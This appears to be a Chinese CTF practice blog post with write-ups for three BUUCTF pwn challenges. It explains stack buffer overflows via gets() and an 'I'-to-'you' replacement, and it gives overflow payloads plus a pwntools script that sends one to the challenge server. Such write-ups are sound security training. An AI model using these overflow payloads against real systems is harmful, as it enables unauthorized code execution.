---
title: BUUCTF-Pwn-刷题记录
tags:
  - buu
  - pwn
abbrlink: 46d4a28d
date: 2021-10-11 19:30:30
---

# warmup_csaw_2016

题目直接给出了函数位置，所以很明显就是要利用gets，gets参数的长度为0x40，所以我们再加上返回地址的8个字节，溢出的总长度为0x48，运行时候可以看出sub_40060D的地址就是它的名字，因此我们可以构建payload

```python
payload = b'a'*0x48+p64(0x40060D)
```

即可得到flag

# ciscn_2019_n_1

打开题目可知大致意思是main函数里面调用了一过func函数，其中要输入v1，但是要判断v2，所以就很明显是需要输入长字符串覆盖到v2的存储空间，覆盖掉即可

```c
.text:0000000000400676                 push    rbp
.text:0000000000400677                 mov     rbp, rsp
.text:000000000040067A                 sub     rsp, 30h
.text:000000000040067E                 pxor    xmm0, xmm0
.text:0000000000400682                 movss   [rbp+var_4], xmm0
.text:0000000000400687                 mov     edi, offset s   ; "Let's guess the number."
.text:000000000040068C                 call    _puts
.text:0000000000400691                 lea     rax, [rbp+var_30]
.text:0000000000400695                 mov     rdi, rax
.text:0000000000400698                 mov     eax, 0
.text:000000000040069D                 call    _gets
.text:00000000004006A2                 movss   xmm0, [rbp+var_4]
.text:00000000004006A7                 ucomiss xmm0, cs:dword_4007F4
.text:00000000004006AE                 jp      short loc_4006CF
.text:00000000004006B0                 movss   xmm0, [rbp+var_4]
.text:00000000004006B5                 ucomiss xmm0, cs:dword_4007F4
.text:00000000004006BC                 jnz     short loc_4006CF
.text:00000000004006BE                 mov     edi, offset command ; "cat /flag"
.text:00000000004006C3                 mov     eax, 0
.text:00000000004006C8                 call    _system
.text:00000000004006CD                 jmp     short loc_4006D9
```

此处需要覆盖0x30-0x4=44个字节给v1，另外4个字节给v2，接着在比较指令ucomiss中找到11.28125的十六进制数`0x41348000`

所以就可以构造出payload`payload = b'a'*44+p64(0x41348000)`

PS:

| 变量类型 | 存储空间 |
| -------- | -------- |
| db       | 1字节    |
| dw       | 2字节    |
| dd       | 4字节    |
| df       | 6字节    |
| dq       | 8字节    |

#### 比较操作

| 指令          | 基于  | 描述         |
| ------------- | ----- | ------------ |
| ucomiss S1,S2 | S2-S1 | 比较单精度值 |
| ucomisd S1,S2 | S2-S1 | 比较双精度值 |

***参数S2必须在XMM寄存器中，而S1可以在XMM寄存器或内存中***

# pwn1_sctf_2016

拿到题目分析，分配的s空间为60，限制输入32，乍一看是不会造成栈溢出的，但是下面有一个字符替换，就是输入I会被替换成you。I是一个字符，you是三个字符，那么我们可以输入20个I（满足32的限制），那么这20个I，最终被替换成了60个字符，从而造成溢出

所以可以构造出payload

```python
from pwn import *

elf=ELF('../pwn1_sctf_2016')

get_flag=elf.symbols['get_flag']

p = remote('node4.buuoj.cn', 26726)

payload = b'I'*20+b'a'*4+p64(get_flag)
p.sendline(payload)
p.interactive()
```

